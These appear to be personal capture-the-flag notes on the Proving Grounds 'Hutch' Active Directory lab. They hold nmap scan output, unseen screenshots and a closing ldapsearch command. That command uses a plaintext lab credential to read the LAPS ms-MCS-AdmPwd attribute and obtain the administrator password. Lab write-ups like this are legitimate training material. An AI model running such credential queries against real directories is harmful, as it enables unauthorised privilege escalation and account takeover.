```
┌──(kali㉿kali)-[~/PG/hutch]
└─$ nmap -p- --min-rate 10000 192.168.174.122
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 03:59 EST
Nmap scan report for 192.168.174.122
Host is up (0.063s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49692/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.67 seconds
                                                                                                                                                            
┌──(kali㉿kali)-[~/PG/hutch]
└─$ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 192.168.174.122 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 04:00 EST
Nmap scan report for 192.168.174.122
Host is up (0.048s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Sun, 16 Feb 2025 09:00:57 GMT
|_  Server Type: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-16 09:00:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-16T09:00:59
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.28 seconds
```

![Pasted image 20250216171003](<0. Attachments/Pasted image 20250216171003.png>)

![Pasted image 20250216171019](<0. Attachments/Pasted image 20250216171019.png>)

![Pasted image 20250216171546](<0. Attachments/Pasted image 20250216171546.png>)

![Pasted image 20250216173900](<0. Attachments/Pasted image 20250216173900.png>)

![Pasted image 20250216173940](<0. Attachments/Pasted image 20250216173940.png>)

![Pasted image 20250216173954](<0. Attachments/Pasted image 20250216173954.png>)

![Pasted image 20250216174833](<0. Attachments/Pasted image 20250216174833.png>)

![Pasted image 20250216175016](<0. Attachments/Pasted image 20250216175016.png>)

![Pasted image 20250216175036](<0. Attachments/Pasted image 20250216175036.png>)


another priv esc way

```
ldapsearch -x -H "ldap://192.168.174.122" -D "hutch\fmcsorley" -w "CrabSharkJellyfish192" -b "dc=hutch,dc=offsec" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
```
![Pasted image 20250216175331](<0. Attachments/Pasted image 20250216175331.png>)

we now have a password for admin

[Hutch | Pentest Everything](https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/windows/hutch)

